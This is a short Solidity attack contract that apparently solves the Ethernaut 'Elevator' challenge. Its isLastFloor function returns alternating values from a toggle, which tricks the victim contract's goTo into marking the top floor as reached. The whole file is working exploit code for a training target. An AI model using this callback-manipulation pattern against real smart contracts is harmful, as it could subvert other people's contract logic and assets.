// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Elevator.sol";

contract  ElevatorAttack {
    bool public toggle = true;
    Elevator public victimcontract;
    
    

    constructor(address _victimContractAddress) public {
        victimcontract = Elevator(_victimContractAddress);
    }

    function isLastFloor(uint) public returns (bool) {
       toggle = !toggle;
       return toggle;
    }

    function SetTop (uint _floor) public {
        victimcontract.goTo(_floor);
    }
}